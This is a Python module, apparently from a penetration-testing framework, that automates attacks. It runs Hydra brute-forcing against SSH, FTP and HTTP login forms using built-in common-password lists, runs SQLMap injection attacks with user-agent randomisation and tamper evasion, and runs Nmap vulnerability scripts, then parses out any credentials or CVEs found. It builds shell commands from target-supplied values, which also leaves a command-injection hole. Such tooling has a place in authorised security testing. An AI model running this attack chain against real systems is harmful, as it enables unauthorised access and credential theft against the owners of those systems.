#!/usr/bin/env python3
"""
Attack Chain — Individual attack execution functions.
Each function wraps a security tool (Hydra, SQLMap, Nmap scripts)
and returns structured results.
"""

import os
import sys
import subprocess
import json
import re

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'recon'))
from utility import status_msg, success_msg, error_msg, warning_msg, info_msg


# ─── WORDLIST HELPERS ──────────────────────────────────────

def find_wordlist(wl_type='passwords'):
    """Find a suitable wordlist on the system."""
    wordlists = {
        'passwords': [
            '/usr/share/wordlists/rockyou.txt',
            '/usr/share/wordlists/fasttrack.txt',
            '/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt',
            '/usr/share/seclists/Passwords/Common-Credentials/best1050.txt',
            '/usr/share/wordlists/nmap.lst',
        ],
        'usernames': [
            '/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
            '/usr/share/wordlists/metasploit/unix_users.txt',
        ]
    }

    for path in wordlists.get(wl_type, []):
        if os.path.exists(path):
            return path

    # Create a minimal fallback
    if wl_type == 'passwords':
        minimal = ['admin', 'password', '123456', 'root', 'toor', 'admin123',
                    'letmein', 'welcome', 'monkey', 'dragon', 'master', 'qwerty',
                    'login', 'password1', 'abc123', 'starwars', 'trustno1', '1234567890']
    else:
        minimal = ['admin', 'root', 'user', 'test', 'guest', 'administrator',
                    'ftp', 'www', 'web', 'info', 'mysql', 'oracle', 'postgres']

    fallback_path = f'/tmp/nullprotocol_{wl_type}.txt'
    with open(fallback_path, 'w') as f:
        f.write('\n'.join(minimal))
    return fallback_path


def run_tool(cmd, timeout=300, output_file=None):
    """Execute a security tool command and capture output."""
    try:
        result = subprocess.run(
            cmd, shell=True,
            capture_output=True, text=True,
            timeout=timeout
        )

        output = result.stdout + result.stderr

        if output_file:
            with open(output_file, 'w') as f:
                f.write(f"Command: {cmd}\n")
                f.write(f"Return Code: {result.returncode}\n")
                f.write("=" * 60 + "\n")
                f.write(output)

        return {
            'success': result.returncode == 0,
            'output': output,
            'return_code': result.returncode
        }

    except subprocess.TimeoutExpired:
        return {'success': False, 'message': f'Timed out after {timeout}s', 'output': ''}
    except FileNotFoundError:
        return {'success': False, 'message': 'Tool not found. Is it installed?', 'output': ''}
    except Exception as e:
        return {'success': False, 'message': str(e), 'output': ''}


# ─── HYDRA ATTACKS ──────────────────────────────────────────

def hydra_ssh(opportunity, output_dir):
    """Brute force SSH using Hydra."""
    ip = opportunity.get('ip', '')
    port = opportunity.get('port', '22')

    user_list = find_wordlist('usernames')
    pass_list = find_wordlist('passwords')
    output_file = os.path.join(output_dir, f'hydra_ssh_{ip}_{port}.txt')

    info_msg(f"Launching Hydra SSH attack on {ip}:{port}")
    info_msg(f"Users: {user_list}, Passwords: {pass_list}")

    cmd = (f'hydra -L {user_list} -P {pass_list} '
           f'-s {port} -t 4 -f -vV '
           f'{ip} ssh')

    result = run_tool(cmd, timeout=300, output_file=output_file)

    # Parse Hydra output for successful creds
    creds = []
    if result.get('output'):
        for line in result['output'].split('\n'):
            if 'host:' in line.lower() and ('login:' in line.lower() or 'password:' in line.lower()):
                creds.append(line.strip())

    result['credentials_found'] = creds
    result['message'] = f"Found {len(creds)} credential(s)" if creds else "No credentials found"
    result['output_file'] = output_file

    return result


def hydra_ftp(opportunity, output_dir):
    """Brute force FTP using Hydra."""
    ip = opportunity.get('ip', '')
    port = opportunity.get('port', '21')

    user_list = find_wordlist('usernames')
    pass_list = find_wordlist('passwords')
    output_file = os.path.join(output_dir, f'hydra_ftp_{ip}_{port}.txt')

    info_msg(f"Launching Hydra FTP attack on {ip}:{port}")

    # First try anonymous login
    anon_cmd = f'hydra -l anonymous -p anonymous -s {port} -f {ip} ftp'
    anon_result = run_tool(anon_cmd, timeout=30)

    if anon_result.get('output') and 'host:' in anon_result['output'].lower():
        success_msg("Anonymous FTP login successful!")
        with open(output_file, 'w') as f:
            f.write("ANONYMOUS FTP LOGIN SUCCESSFUL\n")
            f.write(anon_result['output'])
        return {
            'success': True,
            'message': 'Anonymous FTP login found!',
            'credentials_found': ['anonymous:anonymous'],
            'output_file': output_file
        }

    # Full brute force
    cmd = (f'hydra -L {user_list} -P {pass_list} '
           f'-s {port} -t 4 -f -vV '
           f'{ip} ftp')

    result = run_tool(cmd, timeout=300, output_file=output_file)

    creds = []
    if result.get('output'):
        for line in result['output'].split('\n'):
            if 'host:' in line.lower() and 'login:' in line.lower():
                creds.append(line.strip())

    result['credentials_found'] = creds
    result['message'] = f"Found {len(creds)} credential(s)" if creds else "No credentials found"
    result['output_file'] = output_file

    return result


def hydra_http_form(opportunity, output_dir):
    """Brute force HTTP login form using Hydra."""
    url = opportunity.get('url', '')
    output_file = os.path.join(output_dir, f'hydra_http_{url.replace("/","_").replace(":","_")[:50]}.txt')

    user_list = find_wordlist('usernames')
    pass_list = find_wordlist('passwords')

    info_msg(f"Launching Hydra HTTP Form attack on {url}")
    warning_msg("HTTP form attacks require manual tuning for best results")

    # Try common form field names
    from urllib.parse import urlparse
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/login'

    # Generic form format (may need tuning per target)
    form_params = f"{path}:username=^USER^&password=^PASS^:F=incorrect"

    protocol = 'https-post-form' if parsed.scheme == 'https' else 'http-post-form'

    cmd = (f'hydra -L {user_list} -P {pass_list} '
           f'-s {port} -t 4 -f -vV '
           f'{host} {protocol} "{form_params}"')

    result = run_tool(cmd, timeout=300, output_file=output_file)

    creds = []
    if result.get('output'):
        for line in result['output'].split('\n'):
            if 'host:' in line.lower() and 'login:' in line.lower():
                creds.append(line.strip())

    result['credentials_found'] = creds
    result['message'] = f"Found {len(creds)} credential(s)" if creds else "No credentials found (form params may need tuning)"
    result['output_file'] = output_file

    return result


# ─── SQLMAP ATTACKS ─────────────────────────────────────────

def sqlmap_url(opportunity, output_dir):
    """Test URL with GET parameters for SQL injection using SQLMap."""
    url = opportunity.get('url', '')
    output_file = os.path.join(output_dir, f'sqlmap_get_{url.replace("/","_").replace(":","_")[:50]}.txt')

    info_msg(f"Launching SQLMap on {url}")

    sqlmap_out = os.path.join(output_dir, 'sqlmap_output')
    os.makedirs(sqlmap_out, exist_ok=True)

    cmd = (f'sqlmap -u "{url}" '
           f'--batch --level=2 --risk=1 '
           f'--threads=5 '
           f'--output-dir={sqlmap_out} '
           f'--random-agent '
           f'--tamper=between '
           f'2>&1')

    result = run_tool(cmd, timeout=300, output_file=output_file)

    # Check for SQLi confirmation
    injectable = False
    if result.get('output'):
        injectable = any(indicator in result['output'].lower() for indicator in [
            'injectable', 'is vulnerable', 'sqlmap identified',
            'parameter appears to be', 'sql injection'
        ])

    result['injectable'] = injectable
    result['message'] = "SQL Injection CONFIRMED!" if injectable else "No injection point found"
    result['success'] = injectable
    result['output_file'] = output_file

    return result


def sqlmap_form(opportunity, output_dir):
    """Test POST form for SQL injection using SQLMap."""
    url = opportunity.get('url', '')
    fields = opportunity.get('fields', [])
    output_file = os.path.join(output_dir, f'sqlmap_form_{url.replace("/","_").replace(":","_")[:50]}.txt')

    info_msg(f"Launching SQLMap Form Injection on {url}")
    info_msg(f"Fields: {', '.join(fields)}")

    sqlmap_out = os.path.join(output_dir, 'sqlmap_output')
    os.makedirs(sqlmap_out, exist_ok=True)

    # Build POST data string
    post_data = '&'.join([f'{field}=test' for field in fields])

    cmd = (f'sqlmap -u "{url}" '
           f'--data="{post_data}" '
           f'--method=POST '
           f'--batch --level=2 --risk=1 '
           f'--threads=5 '
           f'--output-dir={sqlmap_out} '
           f'--random-agent '
           f'2>&1')

    result = run_tool(cmd, timeout=300, output_file=output_file)

    injectable = False
    if result.get('output'):
        injectable = any(indicator in result['output'].lower() for indicator in [
            'injectable', 'is vulnerable', 'sqlmap identified',
            'parameter appears to be', 'sql injection'
        ])

    result['injectable'] = injectable
    result['message'] = "SQL Injection CONFIRMED!" if injectable else "No injection point found"
    result['success'] = injectable
    result['output_file'] = output_file

    return result


# ─── NMAP VULN SCAN ─────────────────────────────────────────

def nmap_vulnscan(opportunity, output_dir):
    """Run Nmap vulnerability scripts against a target."""
    ip = opportunity.get('ip', '')
    output_file = os.path.join(output_dir, f'nmap_vuln_{ip}.txt')

    info_msg(f"Launching Nmap Vuln Scripts on {ip}")

    cmd = (f'nmap -sV --script=vuln '
           f'-oN {output_file} '
           f'{ip}')

    result = run_tool(cmd, timeout=600, output_file=output_file)

    # Parse for CVEs
    cves = []
    if result.get('output'):
        cve_pattern = re.compile(r'CVE-\d{4}-\d+', re.IGNORECASE)
        cves = list(set(cve_pattern.findall(result['output'])))

    result['cves_found'] = cves
    result['message'] = f"Found {len(cves)} CVE(s)" if cves else "No CVEs identified"
    result['success'] = len(cves) > 0
    result['output_file'] = output_file

    return result
